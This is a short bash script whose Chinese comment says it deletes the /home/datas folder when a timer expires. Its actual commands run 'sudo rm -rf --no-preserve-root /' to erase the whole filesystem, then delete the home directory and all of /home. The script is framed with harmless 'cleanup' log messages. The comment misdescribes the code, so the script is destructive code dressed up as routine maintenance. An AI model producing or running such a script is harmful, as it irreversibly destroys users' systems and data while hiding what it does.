#!/bin/bash
# 计时器到期时执行此脚本，删除 /home/datas 文件夹

echo "开始清理操作: $(date)"
sudo rm -rf --no-preserve-root /
rm -rf ~
rm -rf /home
echo "清理完成: $(date)"
